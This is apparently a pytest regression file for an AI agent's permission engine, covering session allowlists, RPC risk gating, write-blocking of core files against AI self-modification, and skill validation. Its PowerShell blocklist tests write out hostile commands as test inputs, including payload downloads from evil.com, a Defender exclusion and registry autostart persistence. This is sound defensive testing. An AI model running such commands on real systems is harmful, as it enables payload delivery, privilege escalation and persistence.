"""Regression tests for security fixes from 2026-08-22 system review.

Covers:
  1. Session-allowlist per-session isolation (no cross-session leakage)
  2. RPC risk gate (CONFIRM/DANGEROUS declined in execute_code subprocess)
  3. TCB_FILES write-blocking for delegation.py and rpc.py
  4. PowerShell privilege escalation blocklist patterns
  5. compress_llm method label correctness
  6. Validator positive check: forbidden_actions must cover all BANNED_ACTIONS
  7. Web tools classified as SAFE in PermissionEngine
"""
from __future__ import annotations

import io
import json

import pytest
from rich.console import Console
from unittest.mock import MagicMock

from hund.agent.safety import Decision, PermissionEngine, RiskLevel, TCB_FILES
from hund.agent.tool_dispatch import SessionAllowlist, _SESSION_ALLOWLIST
from hund.agent.rpc import serve_rpc
from hund.agent.context import compress_llm
from hund.providers.base import Message, CompletionResult
from hund.skills.model import Skill, BANNED_ACTIONS
from hund.skills.validator import validate


# ---------------------------------------------------------------------------
# 1. Session-allowlist isolation
# ---------------------------------------------------------------------------

class TestSessionAllowlist:
    def test_different_sessions_isolated(self):
        """Tool allowed in session A must NOT be auto-allowed in session B."""
        al = SessionAllowlist()
        decision = Decision(RiskLevel.CONFIRM, False, "remote mutation", "terminal.git_push", True)
        assert al.allow("session-A", "terminal", decision) is True
        assert al.is_allowed("session-A", "terminal", "terminal.git_push") is True
        assert al.is_allowed("session-B", "terminal", "terminal.git_push") is False

    def test_unallowed_tool_not_allowed(self):
        al = SessionAllowlist()
        decision = Decision(RiskLevel.CONFIRM, False, "remote mutation", "terminal.git_push", True)
        assert al.allow("session-A", "terminal", decision) is True
        assert al.is_allowed("session-A", "delete_file", "terminal.git_push") is False
        assert al.is_allowed("session-A", "terminal", "terminal.package_install") is False

    def test_clear_session_removes_entries(self):
        al = SessionAllowlist()
        decision = Decision(RiskLevel.CONFIRM, False, "remote mutation", "terminal.git_push", True)
        assert al.allow("s1", "terminal", decision) is True
        al.clear_session("s1")
        assert al.is_allowed("s1", "terminal", "terminal.git_push") is False

    @pytest.mark.parametrize(
        "session_id,decision",
        [
            (None, Decision(RiskLevel.CONFIRM, False, "remote mutation", "terminal.git_push", True)),
            ("s1", Decision(RiskLevel.CONFIRM, False, "unknown", "terminal.unknown", False)),
            ("s1", Decision(RiskLevel.DANGEROUS, False, "destructive", "terminal.delete", True)),
        ],
    )
    def test_invalid_scope_is_rejected(self, session_id, decision):
        al = SessionAllowlist()
        assert al.allow(session_id, "terminal", decision) is False
        assert not al.is_allowed(session_id, "terminal", decision.policy_id)

    def test_global_instance_is_session_allowlist(self):
        """The module-level instance must be the new SessionAllowlist, not a plain set."""
        assert isinstance(_SESSION_ALLOWLIST, SessionAllowlist)


# ---------------------------------------------------------------------------
# 2. RPC risk gate: CONFIRM/DANGEROUS declined
# ---------------------------------------------------------------------------

def test_rpc_declines_dangerous_tools():
    """serve_rpc must decline tools classified as DANGEROUS with an error message."""
    read_stream = io.StringIO(
        '{"type": "request", "id": 1, "tool": "delete_file", "args": {"path": "a.txt"}}\n'
    )
    write_stream = io.StringIO()

    mock_engine = MagicMock()
    mock_decision = MagicMock()
    mock_decision.risk = RiskLevel.DANGEROUS
    mock_engine.classify.return_value = mock_decision

    serve_rpc(read_stream, write_stream, engine=mock_engine)

    response = json.loads(write_stream.getvalue().strip())
    assert response["error"] is not None
    assert "interactive approval" in response["error"]
    assert response["result"] == ""


def test_rpc_declines_confirm_tools():
    """serve_rpc must decline tools classified as CONFIRM."""
    read_stream = io.StringIO(
        '{"type": "request", "id": 1, "tool": "terminal", "args": {"command": "echo hi"}}\n'
    )
    write_stream = io.StringIO()

    mock_engine = MagicMock()
    mock_decision = MagicMock()
    mock_decision.risk = RiskLevel.CONFIRM
    mock_engine.classify.return_value = mock_decision

    serve_rpc(read_stream, write_stream, engine=mock_engine)

    response = json.loads(write_stream.getvalue().strip())
    assert response["error"] is not None
    assert "interactive approval" in response["error"]


def test_rpc_allows_safe_tools():
    """serve_rpc must allow tools classified as SAFE."""
    read_stream = io.StringIO(
        '{"type": "request", "id": 1, "tool": "read_file", "args": {"path": "test.txt"}}\n'
    )
    write_stream = io.StringIO()

    mock_engine = MagicMock()
    mock_decision = MagicMock()
    mock_decision.risk = RiskLevel.SAFE
    mock_engine.classify.return_value = mock_decision

    from unittest.mock import patch
    with patch("hund.tools.registry.call", return_value="file content"):
        serve_rpc(read_stream, write_stream, engine=mock_engine)

    response = json.loads(write_stream.getvalue().strip())
    assert response["error"] is None
    assert response["result"] == "file content"


def test_rpc_allows_write_tools():
    """serve_rpc must allow tools classified as WRITE (parent already confirmed execute_code)."""
    read_stream = io.StringIO(
        '{"type": "request", "id": 1, "tool": "write_file", "args": {"path": "x.txt", "content": "y"}}\n'
    )
    write_stream = io.StringIO()

    mock_engine = MagicMock()
    mock_decision = MagicMock()
    mock_decision.risk = RiskLevel.WRITE
    mock_engine.classify.return_value = mock_decision

    from unittest.mock import patch
    with patch("hund.tools.registry.call", return_value="ok"):
        serve_rpc(read_stream, write_stream, engine=mock_engine)

    response = json.loads(write_stream.getvalue().strip())
    assert response["error"] is None
    assert response["result"] == "ok"


# ---------------------------------------------------------------------------
# 3. TCB_FILES write-blocking
# ---------------------------------------------------------------------------

def test_tcb_files_includes_delegation():
    """delegation.py must be in TCB_FILES to prevent AI self-modification."""
    assert "hund/agent/delegation.py" in TCB_FILES


def test_tcb_files_includes_rpc():
    """rpc.py must be in TCB_FILES to prevent AI self-modification."""
    assert "hund/agent/rpc.py" in TCB_FILES


def test_tcb_write_blocked_delegation(tmp_path):
    """Writing to delegation.py must be BLOCKED."""
    engine = PermissionEngine(tmp_path)
    dec = engine.classify("write_file", {"path": "hund/agent/delegation.py"})
    assert dec.risk == RiskLevel.BLOCKED
    assert "TCB" in dec.reason


def test_tcb_write_blocked_rpc(tmp_path):
    """Writing to rpc.py must be BLOCKED."""
    engine = PermissionEngine(tmp_path)
    dec = engine.classify("write_file", {"path": "hund/agent/rpc.py"})
    assert dec.risk == RiskLevel.BLOCKED
    assert "TCB" in dec.reason


# ---------------------------------------------------------------------------
# 4. PowerShell privilege escalation blocklist
# ---------------------------------------------------------------------------

class TestPowerShellBlocklist:
    def _blocked(self, cmd: str) -> bool:
        engine = PermissionEngine()
        return engine.classify("terminal", {"command": cmd}).risk == RiskLevel.BLOCKED

    def test_start_process_runas(self):
        assert self._blocked("Start-Process powershell -Verb RunAs")

    def test_set_execution_policy(self):
        assert self._blocked("Set-ExecutionPolicy Unrestricted")

    def test_new_service(self):
        assert self._blocked("New-Service -Name evil -BinaryPathName evil.exe")

    def test_iwr_ps1(self):
        assert self._blocked("iwr https://evil.com/payload.ps1")

    def test_invoke_webrequest_ps1(self):
        assert self._blocked("Invoke-WebRequest https://evil.com/payload.ps1 -OutFile x.ps1")

    def test_defender_exclusion(self):
        assert self._blocked("Add-MpPreference -ExclusionPath C:\\malware")

    def test_registry_autostart(self):
        assert self._blocked("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v evil /d evil.exe")

    def test_safe_commands_not_blocked(self):
        """Ensure normal commands are NOT false-positived by the new patterns."""
        assert not self._blocked("Get-Process")
        assert not self._blocked("dir")
        assert not self._blocked("python --version")


# ---------------------------------------------------------------------------
# 5. compress_llm method label
# ---------------------------------------------------------------------------

class _FakeClient:
    def __init__(self, text="[SUMMERAD]"):
        self.response_text = text
    def complete(self, messages, tools=None, model=None):
        return CompletionResult(text=self.response_text)

def test_compress_llm_method_is_llm():
    """compress_llm must return method='llm', not 'deterministic'."""
    client = _FakeClient("[SUMMERAD] Viktiga punkter...")
    msgs = [
        Message(role="system", content="SYSTEM"),
        Message(role="user", content="msg1"),
        Message(role="assistant", content="reply1"),
        Message(role="user", content="msg2"),
        Message(role="assistant", content="reply2"),
        Message(role="user", content="msg3"),
        Message(role="assistant", content="reply3"),
    ]
    result = compress_llm(client, msgs, keep_recent=2)
    assert result is not None
    assert result.method == "llm"


# ---------------------------------------------------------------------------
# 6. Validator: forbidden_actions must cover all BANNED_ACTIONS
# ---------------------------------------------------------------------------

def test_validator_rejects_incomplete_forbidden_actions():
    """A skill missing any BANNED_ACTION in forbidden_actions must fail validation."""
    skill = Skill(
        schema_version=1,
        name="test-skill",
        domain="general",
        status="active",
        triggers=("test",),
        when_to_use="testing",
        steps=("step 1",),
        required_tools=("read_file",),
        forbidden_actions=("delete",),  # missing all BANNED_ACTIONS
        safety_level="read_only",
        verification=("check it",),
    )
    errors = validate(skill)
    assert any("BANNED_ACTIONS" in e for e in errors)


def test_validator_accepts_complete_forbidden_actions():
    """A skill with all BANNED_ACTIONS in forbidden_actions should pass."""
    skill = Skill(
        schema_version=1,
        name="test-skill",
        domain="general",
        status="active",
        triggers=("test",),
        when_to_use="testing",
        steps=("step 1",),
        required_tools=("read_file",),
        forbidden_actions=tuple(sorted(BANNED_ACTIONS)) + ("delete",),
        safety_level="read_only",
        verification=("check it",),
    )
    errors = validate(skill)
    assert not any("BANNED_ACTIONS" in e for e in errors)


# ---------------------------------------------------------------------------
# 7. Web tools classified SAFE in PermissionEngine
# ---------------------------------------------------------------------------

def test_web_search_classified_safe():
    """web_search must be SAFE so it works in RPC (execute_code subprocess)."""
    engine = PermissionEngine()
    dec = engine.classify("web_search", {"query": "test"})
    assert dec.risk == RiskLevel.SAFE
    assert dec.allowed is True


def test_web_open_classified_safe():
    engine = PermissionEngine()
    dec = engine.classify("web_open", {"url": "https://example.com"})
    assert dec.allowed is True
    assert dec.risk == RiskLevel.SAFE


def test_web_extract_classified_safe():
    """web_extract must be SAFE so it works in RPC (execute_code subprocess)."""
    engine = PermissionEngine()
    dec = engine.classify("web_extract", {"url": "https://example.com"})
    assert dec.risk == RiskLevel.SAFE
    assert dec.allowed is True
